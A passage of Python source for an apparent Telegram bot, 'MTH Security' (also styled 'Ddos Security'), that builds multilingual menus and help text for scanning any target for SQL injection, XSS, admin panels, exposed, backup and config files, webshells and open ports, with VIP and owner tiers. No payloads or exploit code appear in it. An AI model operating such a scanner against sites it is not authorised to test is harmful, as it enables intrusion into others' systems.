        'es': {'title': '🎯 Vulnerabilidades', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'admin': '🔑 Admin Panel', 'ports': '🔌 Ports', 'dirs': '📁 Directories', 'sub': '🌐 Subdomains', 'wp': '📝 WordPress', 'ftpssh': '📡 FTP/SSH', 'emails': '📧 Emails', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse IP', 'dns': '📡 DNS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep Scan', 'back': '🔙 Volver', 'enter': '👆 Toque una herramienta y envíe el objetivo.'},
        'vi': {'title': '🎯 Lỗ hổng', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'admin': '🔑 Admin Panel', 'ports': '🔌 Ports', 'dirs': '📁 Directories', 'sub': '🌐 Subdomains', 'wp': '📝 WordPress', 'ftpssh': '📡 FTP/SSH', 'emails': '📧 Emails', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse IP', 'dns': '📡 DNS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep Scan', 'back': '🔙 Quay lại', 'enter': '👆 Nhấn công cụ và gửi mục tiêu.'},
        'id': {'title': '🎯 Kerentanan', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'admin': '🔑 Admin Panel', 'ports': '🔌 Ports', 'dirs': '📁 Directories', 'sub': '🌐 Subdomains', 'wp': '📝 WordPress', 'ftpssh': '📡 FTP/SSH', 'emails': '📧 Emails', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse IP', 'dns': '📡 DNS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep Scan', 'back': '🔙 Kembali', 'enter': '👆 Ketuk alat dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    buttons = [
        [{"text": b['sqli'], "callback_data": "target:sqli:normal"},
         {"text": b['xss'], "callback_data": "target:xss:normal"}],
        [{"text": b['admin'], "callback_data": "target:admin:normal"},
         {"text": b['ports'], "callback_data": "target:ports:normal"}],
        [{"text": b['dirs'], "callback_data": "target:dirs:normal"},
         {"text": b['sub'], "callback_data": "target:sub:normal"}],
        [{"text": b['wp'], "callback_data": "target:wp:normal"},
         {"text": b['ftpssh'], "callback_data": "target:ftpssh:normal"}],
        [{"text": b['emails'], "callback_data": "target:emails:normal"},
         {"text": b['cms'], "callback_data": "target:cms:normal"}],
        [{"text": b['reverse'], "callback_data": "target:reverse:normal"},
         {"text": b['dns'], "callback_data": "target:dns:normal"}],
        [{"text": b['scanall'], "callback_data": "target:scanall:normal"},
         {"text": b['deep'], "callback_data": "target:deep:normal"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass


def show_menu_recon(chat_id, user_id):
    """Show clean Reconnaissance page"""
    lang = get_user_lang(user_id)
    btn = {
        'pt': {'title': '🔍 Reconhecimento', 'info': '🌐 Info', 'whois': '📋 Whois', 'ip': '📍 GeoIP', 'traceroute': '📡 Traceroute', 'dns': '📡 DNS', 'sub': '🌐 Subdomains', 'tech': '🔧 Tech', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse', 'emails': '📧 Emails', 'back': '🔙 Voltar', 'enter': '👆 Toque em uma ferramenta e envie o alvo.'},
        'en': {'title': '🔍 Reconnaissance', 'info': '🌐 Info', 'whois': '📋 Whois', 'ip': '📍 GeoIP', 'traceroute': '📡 Traceroute', 'dns': '📡 DNS', 'sub': '🌐 Subdomains', 'tech': '🔧 Tech', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse', 'emails': '📧 Emails', 'back': '🔙 Back', 'enter': '👆 Tap a tool and send the target.'},
        'es': {'title': '🔍 Reconocimiento', 'info': '🌐 Info', 'whois': '📋 Whois', 'ip': '📍 GeoIP', 'traceroute': '📡 Traceroute', 'dns': '📡 DNS', 'sub': '🌐 Subdomains', 'tech': '🔧 Tech', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse', 'emails': '📧 Emails', 'back': '🔙 Volver', 'enter': '👆 Toque una herramienta y envíe el objetivo.'},
        'vi': {'title': '🔍 Trinh sát', 'info': '🌐 Info', 'whois': '📋 Whois', 'ip': '📍 GeoIP', 'traceroute': '📡 Traceroute', 'dns': '📡 DNS', 'sub': '🌐 Subdomains', 'tech': '🔧 Tech', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse', 'emails': '📧 Emails', 'back': '🔙 Quay lại', 'enter': '👆 Nhấn công cụ và gửi mục tiêu.'},
        'id': {'title': '🔍 Pengintaian', 'info': '🌐 Info', 'whois': '📋 Whois', 'ip': '📍 GeoIP', 'traceroute': '📡 Traceroute', 'dns': '📡 DNS', 'sub': '🌐 Subdomains', 'tech': '🔧 Tech', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse', 'emails': '📧 Emails', 'back': '🔙 Kembali', 'enter': '👆 Ketuk alat dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    buttons = [
        [{"text": b['info'], "callback_data": "target:info:normal"},
         {"text": b['whois'], "callback_data": "target:whois:normal"}],
        [{"text": b['ip'], "callback_data": "target:ip:normal"},
         {"text": b['traceroute'], "callback_data": "target:traceroute:normal"}],
        [{"text": b['dns'], "callback_data": "target:dns:normal"},
         {"text": b['sub'], "callback_data": "target:sub:normal"}],
        [{"text": b['tech'], "callback_data": "target:tech:normal"},
         {"text": b['cms'], "callback_data": "target:cms:normal"}],
        [{"text": b['reverse'], "callback_data": "target:reverse:normal"},
         {"text": b['emails'], "callback_data": "target:emails:normal"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass

def show_menu_audit(chat_id, user_id):
    """Show clean Security Audit page"""
    lang = get_user_lang(user_id)
    btn = {
        'pt': {'title': '🛡️ Auditoria', 'ssl': '🔒 SSL', 'sslchain': '🔗 SSL Chain', 'headers': '📋 Headers', 'http': '🌐 HTTP', 'cors': '🔀 CORS', 'rate': '⭐ Rating', 'robots': '🤖 Robots.txt', 'sitemap': '🗺️ Sitemap', 'back': '🔙 Voltar', 'enter': '👆 Toque em uma ferramenta e envie o alvo.'},
        'en': {'title': '🛡️ Audit', 'ssl': '🔒 SSL', 'sslchain': '🔗 SSL Chain', 'headers': '📋 Headers', 'http': '🌐 HTTP', 'cors': '🔀 CORS', 'rate': '⭐ Rating', 'robots': '🤖 Robots.txt', 'sitemap': '🗺️ Sitemap', 'back': '🔙 Back', 'enter': '👆 Tap a tool and send the target.'},
        'es': {'title': '🛡️ Auditoría', 'ssl': '🔒 SSL', 'sslchain': '🔗 SSL Chain', 'headers': '📋 Headers', 'http': '🌐 HTTP', 'cors': '🔀 CORS', 'rate': '⭐ Rating', 'robots': '🤖 Robots.txt', 'sitemap': '🗺️ Sitemap', 'back': '🔙 Volver', 'enter': '👆 Toque una herramienta y envíe el objetivo.'},
        'vi': {'title': '🛡️ Kiểm tra', 'ssl': '🔒 SSL', 'sslchain': '🔗 SSL Chain', 'headers': '📋 Headers', 'http': '🌐 HTTP', 'cors': '🔀 CORS', 'rate': '⭐ Rating', 'robots': '🤖 Robots.txt', 'sitemap': '🗺️ Sitemap', 'back': '🔙 Quay lại', 'enter': '👆 Nhấn công cụ và gửi mục tiêu.'},
        'id': {'title': '🛡️ Audit', 'ssl': '🔒 SSL', 'sslchain': '🔗 SSL Chain', 'headers': '📋 Headers', 'http': '🌐 HTTP', 'cors': '🔀 CORS', 'rate': '⭐ Rating', 'robots': '🤖 Robots.txt', 'sitemap': '🗺️ Sitemap', 'back': '🔙 Kembali', 'enter': '👆 Ketuk alat dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    buttons = [
        [{"text": b['ssl'], "callback_data": "target:ssl:normal"},
         {"text": b['sslchain'], "callback_data": "target:sslchain:normal"}],
        [{"text": b['headers'], "callback_data": "target:headers:normal"},
         {"text": b['http'], "callback_data": "target:http:normal"}],
        [{"text": b['cors'], "callback_data": "target:cors:normal"},
         {"text": b['rate'], "callback_data": "target:rate:normal"}],
        [{"text": b['robots'], "callback_data": "target:robots:normal"},
         {"text": b['sitemap'], "callback_data": "target:sitemap:normal"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass

def show_menu_files(chat_id, user_id):
    """Show clean Files & Directories page"""
    lang = get_user_lang(user_id)
    btn = {
        'pt': {'title': '📂 Arquivos & Direções', 'admin': '🔑 Admin Panel', 'dirs': '📁 Dirs', 'ports': '🔌 Ports', 'ftpssh': '📡 FTP/SSH', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Webshell', 'api': '🔌 API', 'wp': '📝 WordPress', 'back': '🔙 Voltar', 'enter': '👆 Toque em uma ferramenta e envie o alvo.'},
        'en': {'title': '📂 Files & Directories', 'admin': '🔑 Admin Panel', 'dirs': '📁 Dirs', 'ports': '🔌 Ports', 'ftpssh': '📡 FTP/SSH', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Webshell', 'api': '🔌 API', 'wp': '📝 WordPress', 'back': '🔙 Back', 'enter': '👆 Tap a tool and send the target.'},
        'es': {'title': '📂 Archivos & Directorios', 'admin': '🔑 Admin Panel', 'dirs': '📁 Dirs', 'ports': '🔌 Ports', 'ftpssh': '📡 FTP/SSH', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Webshell', 'api': '🔌 API', 'wp': '📝 WordPress', 'back': '🔙 Volver', 'enter': '👆 Toque una herramienta y envíe el objetivo.'},
        'vi': {'title': '📂 Tệp & Thư mục', 'admin': '🔑 Admin Panel', 'dirs': '📁 Dirs', 'ports': '🔌 Ports', 'ftpssh': '📡 FTP/SSH', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Webshell', 'api': '🔌 API', 'wp': '📝 WordPress', 'back': '🔙 Quay lại', 'enter': '👆 Nhấn công cụ và gửi mục tiêu.'},
        'id': {'title': '📂 File & Direktori', 'admin': '🔑 Admin Panel', 'dirs': '📁 Dirs', 'ports': '🔌 Ports', 'ftpssh': '📡 FTP/SSH', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Webshell', 'api': '🔌 API', 'wp': '📝 WordPress', 'back': '🔙 Kembali', 'enter': '👆 Ketuk alat dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    buttons = [
        [{"text": b['admin'], "callback_data": "target:admin:normal"},
         {"text": b['dirs'], "callback_data": "target:dirs:normal"}],
        [{"text": b['ports'], "callback_data": "target:ports:normal"},
         {"text": b['ftpssh'], "callback_data": "target:ftpssh:normal"}],
        [{"text": b['exposed'], "callback_data": "target:exposed:normal"},
         {"text": b['backup'], "callback_data": "target:backup:normal"}],
        [{"text": b['config'], "callback_data": "target:config:normal"},
         {"text": b['shell'], "callback_data": "target:shell:normal"}],
        [{"text": b['api'], "callback_data": "target:api:normal"},
         {"text": b['wp'], "callback_data": "target:wp:normal"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass

def show_menu_vip(chat_id, user_id):
    """Show clean VIP exclusive page"""
    lang = get_user_lang(user_id)
    owner = is_owner(user_id)
    btn = {
        'pt': {'title': '⭐ VIP', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'admin': '🔑 Admin', 'api': '🔌 API', 'cors': '🔀 CORS', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Shell', 'robots': '🤖 Robots', 'back': '🔙 Voltar', 'access': 'Acesso', 'enter': '👆 Toque em uma ferramenta VIP e envie o alvo.'},
        'en': {'title': '⭐ VIP', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'admin': '🔑 Admin', 'api': '🔌 API', 'cors': '🔀 CORS', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Shell', 'robots': '🤖 Robots', 'back': '🔙 Back', 'access': 'Access', 'enter': '👆 Tap a VIP tool and send the target.'},
        'es': {'title': '⭐ VIP', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'admin': '🔑 Admin', 'api': '🔌 API', 'cors': '🔀 CORS', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Shell', 'robots': '🤖 Robots', 'back': '🔙 Volver', 'access': 'Acceso', 'enter': '👆 Toque una herramienta VIP y envíe el objetivo.'},
        'vi': {'title': '⭐ VIP', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'admin': '🔑 Admin', 'api': '🔌 API', 'cors': '🔀 CORS', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Shell', 'robots': '🤖 Robots', 'back': '🔙 Quay lại', 'access': 'Truy cập', 'enter': '👆 Nhấn công cụ VIP và gửi mục tiêu.'},
        'id': {'title': '⭐ VIP', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'admin': '🔑 Admin', 'api': '🔌 API', 'cors': '🔀 CORS', 'exposed': '⚠️ Exposed', 'backup': '💾 Backup', 'config': '⚙️ Config', 'shell': '🐚 Shell', 'robots': '🤖 Robots', 'back': '🔙 Kembali', 'access': 'Akses', 'enter': '👆 Ketuk alat VIP dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    badge = '👑 + ⭐' if owner else '⭐'
    buttons = [
        [{"text": b['sqli'], "callback_data": "target:sqli:vip"},
         {"text": b['xss'], "callback_data": "target:xss:vip"}],
        [{"text": b['scanall'], "callback_data": "target:scanall:vip"},
         {"text": b['deep'], "callback_data": "target:deep:vip"}],
        [{"text": b['ports'], "callback_data": "target:ports:vip"},
         {"text": b['headers'], "callback_data": "target:headers:vip"}],
        [{"text": b['dns'], "callback_data": "target:dns:vip"},
         {"text": b['tech'], "callback_data": "target:tech:vip"}],
        [{"text": b['admin'], "callback_data": "target:admin:vip"},
         {"text": b['api'], "callback_data": "target:api:vip"}],
        [{"text": b['cors'], "callback_data": "target:cors:vip"},
         {"text": b['exposed'], "callback_data": "target:exposed:vip"}],
        [{"text": b['backup'], "callback_data": "target:backup:vip"},
         {"text": b['config'], "callback_data": "target:config:vip"}],
        [{"text": b['shell'], "callback_data": "target:shell:vip"},
         {"text": b['robots'], "callback_data": "target:robots:vip"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>{b['access']}:</b> {badge}\n\n"
        f"{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass


def show_menu_owner(chat_id, user_id):
    """Show clean Owner exclusive page"""
    lang = get_user_lang(user_id)
    if not is_owner(user_id):
        denied = {
            'pt': '🚫 <b>Acesso negado.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\nApenas Donos têm acesso a estas ferramentas.\n\nSe você é dono, entre em contato com @OnlyExaltarei.',
            'en': '🚫 <b>Access Denied.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\nOnly Owners have access to these tools.\n\nIf you are an owner, contact @OnlyExaltarei.',
            'es': '🚫 <b>Acceso Denegado.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\nSolo los Propietarios tienen acceso a estas herramientas.\n\nSi eres propietario, contacta a @OnlyExaltarei.',
            'vi': '🚫 <b>Truy cập bị từ chối.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\nChỉ Owner mới có quyền truy cập các công cụ này.\n\nNếu bạn là owner, liên hệ @OnlyExaltarei.',
            'id': '🚫 <b>Akses Ditolak.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\nHanya Owner yang memiliki akses ke alat ini.\n\nJika Anda owner, hubungi @OnlyExaltarei.',
        }
        send_message(chat_id, denied.get(lang, denied['pt']))
        return
    btn = {
        'pt': {'title': '👑 DONO', 'forensic': '🔬 Forensic', 'pentest': '⚔️ Pentest', 'osint': '🕵️ OSINT', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'ssl': '🔒 SSL', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'api': '🔌 API', 'config': '⚙️ Config', 'exposed': '⚠️ Exposed', 'shell': '🐚 Shell', 'back': '🔙 Voltar', 'exclusive': 'Acesso Exclusivo: Donos', 'enter': '👆 Toque em uma ferramenta e envie o alvo.'},
        'en': {'title': '👑 Owner', 'forensic': '🔬 Forensic', 'pentest': '⚔️ Pentest', 'osint': '🕵️ OSINT', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'ssl': '🔒 SSL', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'api': '🔌 API', 'config': '⚙️ Config', 'exposed': '⚠️ Exposed', 'shell': '🐚 Shell', 'back': '🔙 Back', 'exclusive': 'Exclusive: Owner Only', 'enter': '👆 Tap a tool and send the target.'},
        'es': {'title': '👑 Owner', 'forensic': '🔬 Forensic', 'pentest': '⚔️ Pentest', 'osint': '🕵️ OSINT', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'ssl': '🔒 SSL', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'api': '🔌 API', 'config': '⚙️ Config', 'exposed': '⚠️ Exposed', 'shell': '🐚 Shell', 'back': '🔙 Volver', 'exclusive': 'Acceso Exclusivo: Solo Owners', 'enter': '👆 Toque una herramienta y envíe el objetivo.'},
        'vi': {'title': '👑 Owner', 'forensic': '🔬 Forensic', 'pentest': '⚔️ Pentest', 'osint': '🕵️ OSINT', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'ssl': '🔒 SSL', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'api': '🔌 API', 'config': '⚙️ Config', 'exposed': '⚠️ Exposed', 'shell': '🐚 Shell', 'back': '🔙 Quay lại', 'exclusive': 'Truy cập Độc quyền: Owner', 'enter': '👆 Nhấn công cụ và gửi mục tiêu.'},
        'id': {'title': '👑 Owner', 'forensic': '🔬 Forensic', 'pentest': '⚔️ Pentest', 'osint': '🕵️ OSINT', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep', 'ports': '🔌 Ports', 'ssl': '🔒 SSL', 'headers': '📋 Headers', 'dns': '📡 DNS', 'tech': '🔧 Tech', 'api': '🔌 API', 'config': '⚙️ Config', 'exposed': '⚠️ Exposed', 'shell': '🐚 Shell', 'back': '🔙 Kembali', 'exclusive': 'Akses Eksklusif: Owner', 'enter': '👆 Ketuk alat dan kirim target.'},
    }
    b = btn.get(lang, btn['pt'])
    buttons = [
        [{"text": b['forensic'], "callback_data": "cmd:forensic"},
         {"text": b['pentest'], "callback_data": "cmd:pentest"}],
        [{"text": b['osint'], "callback_data": "cmd:osint"},
         {"text": b['sqli'], "callback_data": "target:sqli:owner"}],
        [{"text": b['xss'], "callback_data": "target:xss:owner"},
         {"text": b['scanall'], "callback_data": "target:scanall:owner"}],
        [{"text": b['deep'], "callback_data": "target:deep:owner"},
         {"text": b['ports'], "callback_data": "target:ports:owner"}],
        [{"text": b['ssl'], "callback_data": "target:ssl:owner"},
         {"text": b['headers'], "callback_data": "target:headers:owner"}],
        [{"text": b['dns'], "callback_data": "target:dns:owner"},
         {"text": b['tech'], "callback_data": "target:tech:owner"}],
        [{"text": b['api'], "callback_data": "target:api:owner"},
         {"text": b['config'], "callback_data": "target:config:owner"}],
        [{"text": b['exposed'], "callback_data": "target:exposed:owner"},
         {"text": b['shell'], "callback_data": "target:shell:owner"}],
        [{"text": b['back'], "callback_data": "menu:back"}],
    ]
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>{b['exclusive']}</b>\n\n"
        f"{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass


def handle_help(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)
    lang = get_user_lang(user_id)
    if lang == 'en':
        msg = """🔧 <b>MTH Security — Important Commands</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 Getting Started:</b>
/start — Main menu
/help — This message

<b>📡 Essential Scanners:</b>
/sqli &lt;url&gt; — SQL Injection
/xss &lt;url&gt; — XSS Detection
/scanall &lt;url&gt; — Full scan (6 tools)
/deep &lt;url&gt; — Deep vulnerability scan
/admin &lt;url&gt; — Admin panel finder
/ports &lt;ip&gt; — Port scanner
/info &lt;url&gt; — Full site info
/dns &lt;domain&gt; — DNS analysis
/headers &lt;url&gt; — Security headers
/ssl &lt;url&gt; — SSL/TLS audit
/exposed &lt;url&gt; — Sensitive files
/dirs &lt;url&gt; — Directory scanner

<b>🔍 Tools:</b>
/batch &lt;cmd&gt; &lt;urls...&gt; — Multi-target scan
/watch &lt;url&gt; [min] — Content monitor
/rate &lt;url&gt; — Security score
/cancel — Cancel active scan
/lang &lt;pt/en/es/vi/id&gt; — Change language

<b>📊 System:</b>
/ping — Bot latency
/about — About MTH Security
/stats — Your scan statistics

━━━━━━━━━━━━━━━━━━━━━━
<i>Use the menu buttons for all available tools.</i>
<i>For full command list, use the menu system.</i>
<i>Use /listdn to see Owner commands.</i>

━━━━━━━━━━━━━━━━━━━━━━
<i>MTH Security v5.2</i>"""
    elif lang == 'es':
        msg = """🔧 <b>MTH Security — Comandos Importantes</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 Inicio:</b>
/start — Menú principal
/help — Este mensaje

<b>📡 Escáneres Esenciales:</b>
/sqli &lt;url&gt; — SQL Injection
/xss &lt;url&gt; — Detección XSS
/scanall &lt;url&gt; — Escaneo completo (6 tools)
/deep &lt;url&gt; — Escaneo profundo
/admin &lt;url&gt; — Buscador de admin
/ports &lt;ip&gt; — Escáner de puertos
/info &lt;url&gt; — Info completa del sitio
/dns &lt;domain&gt; — Análisis DNS
/headers &lt;url&gt; — Security headers
/ssl &lt;url&gt; — Auditoría SSL
/exposed &lt;url&gt; — Archivos sensibles
/dirs &lt;url&gt; — Escáner de directorios

<b>🔍 Herramientas:</b>
/batch &lt;cmd&gt; &lt;urls...&gt; — Multi-target
/watch &lt;url&gt; [min] — Monitor de contenido
/rate &lt;url&gt; — Puntuación de seguridad
/cancel — Cancelar escaneo
/lang &lt;pt/en/es/vi/id&gt; — Cambiar idioma

<b>📊 Sistema:</b>
/ping — Latencia del bot
/about — Sobre MTH Security
/stats — Estadísticas de escaneo

━━━━━━━━━━━━━━━━━━━━━━
<i>Use los botones del menú para todas las herramientas.</i>
<i>Para la lista completa, use el sistema de menú.</i>
<i>Use /listdn para ver comandos de Owner.</i>

━━━━━━━━━━━━━━━━━━━━━━
<i>MTH Security v5.2</i>"""
    elif lang == 'vi':
        msg = """🔧 <b>MTH Security — Lệnh Quan Trọng</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 Bắt Đầu:</b>
/start — Menu chính
/help — Tin nhắn này

<b>📡 Máy Quét:</b>
/sqli &lt;url&gt; — SQL Injection
/xss &lt;url&gt; — Phát hiện XSS
/scanall &lt;url&gt; — Quét toàn diện (6 công cụ)
/deep &lt;url&gt; — Quét lỗ hổng sâu
/admin &lt;url&gt; — Tìm admin panel
/ports &lt;ip&gt; — Quét cổng
/info &lt;url&gt; — Thông tin trang web
/dns &lt;domain&gt; — Phân tích DNS
/headers &lt;url&gt; — Security headers
/ssl &lt;url&gt; — Kiểm tra SSL
/exposed &lt;url&gt; — Tệp nhạy cảm
/dirs &lt;url&gt; — Quét thư mục

<b>🔍 Công Cụ:</b>
/batch &lt;cmd&gt; &lt;urls...&gt; — Quét nhiều mục tiêu
/watch &lt;url&gt; [min] — Giám sát nội dung
/rate &lt;url&gt; — Điểm bảo mật
/cancel — Hủy quét
/lang &lt;pt/en/es/vi/id&gt; — Đổi ngôn ngữ

<b>📊 Hệ Thống:</b>
/ping — Độ trễ bot
/about — Về MTH Security
/stats — Thống kê quét

━━━━━━━━━━━━━━━━━━━━━━
<i>Sử dụng nút menu để xem tất cả công cụ.</i>
<i>Dùng /listdn để xem lệnh Owner.</i>

━━━━━━━━━━━━━━━━━━━━━━
<i>MTH Security v5.2</i>"""
    elif lang == 'id':
        msg = """🔧 <b>MTH Security — Perintah Penting</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 Memulai:</b>
/start — Menu utama
/help — Pesan ini

<b>📡 Pemindai:</b>
/sqli &lt;url&gt; — SQL Injection
/xss &lt;url&gt; — Deteksi XSS
/scanall &lt;url&gt; — Pemindaian penuh (6 alat)
/deep &lt;url&gt; — Pemindaian mendalam
/admin &lt;url&gt; — Pencari admin panel
/ports &lt;ip&gt; — Pemindai port
/info &lt;url&gt; — Info situs lengkap
/dns &lt;domain&gt; — Analisis DNS
/headers &lt;url&gt; — Security headers
/ssl &lt;url&gt; — Audit SSL
/exposed &lt;url&gt; — File sensitif
/dirs &lt;url&gt; — Pemindai direktori

<b>🔍 Alat:</b>
/batch &lt;cmd&gt; &lt;urls...&gt; — Multi-target
/watch &lt;url&gt; [min] — Monitor konten
/rate &lt;url&gt; — Skor keamanan
/cancel — Batal pemindaian
/lang &lt;pt/en/es/vi/id&gt; — Ganti bahasa

<b>📊 Sistem:</b>
/ping — Latensi bot
/about — Tentang MTH Security
/stats — Statistik pemindaian

━━━━━━━━━━━━━━━━━━━━━━
<i>Gunakan tombol menu untuk semua alat.</i>
<i>Gunakan /listdn untuk perintah Owner.</i>

━━━━━━━━━━━━━━━━━━━━━━
<i>MTH Security v5.2</i>"""
    else:
        msg = """🔧 <b>MTH Security — Comandos Importantes</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 Início:</b>
/start — Menu principal
/help — Esta mensagem

<b>📡 Scanners Essenciais:</b>
/sqli &lt;url&gt; — SQL Injection
/xss &lt;url&gt; — Detecção XSS
/scanall &lt;url&gt; — Scan completo (6 ferramentas)
/deep &lt;url&gt; — Scan profundo de vulnerabilidades
/admin &lt;url&gt; — Buscador de admin panel
/ports &lt;ip&gt; — Scanner de portas
/info &lt;url&gt; — Info completa do site
/dns &lt;domain&gt; — Análise DNS
/headers &lt;url&gt; — Security headers
/ssl &lt;url&gt; — Auditoria SSL
/exposed &lt;url&gt; — Arquivos sensíveis
/dirs &lt;url&gt; — Scanner de diretórios

<b>🔍 Ferramentas:</b>
/batch &lt;cmd&gt; &lt;urls...&gt; — Scan em múltiplos alvos
/watch &lt;url&gt; [min] — Monitorar conteúdo
/rate &lt;url&gt; — Nota de segurança
/cancel — Cancelar scan ativo
/lang &lt;pt/en/es/vi/id&gt; — Mudar idioma

<b>📊 Sistema:</b>
/ping — Latência do bot
/about — Sobre o MTH Security
/stats — Estatísticas de scan

━━━━━━━━━━━━━━━━━━━━━━
<i>Use os botões do menu para todas as ferramentas.</i>
<i>Para a lista completa, use o sistema de menu.</i>
<i>Use /listdn para ver comandos de Owner.</i>

━━━━━━━━━━━━━━━━━━━━━━
<i>MTH Security v5.2</i>"""
    send_message(chat_id, msg)


def handle_about(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)
    msg = """🛡️ <b>Mth Ddos Security v5.2</b>
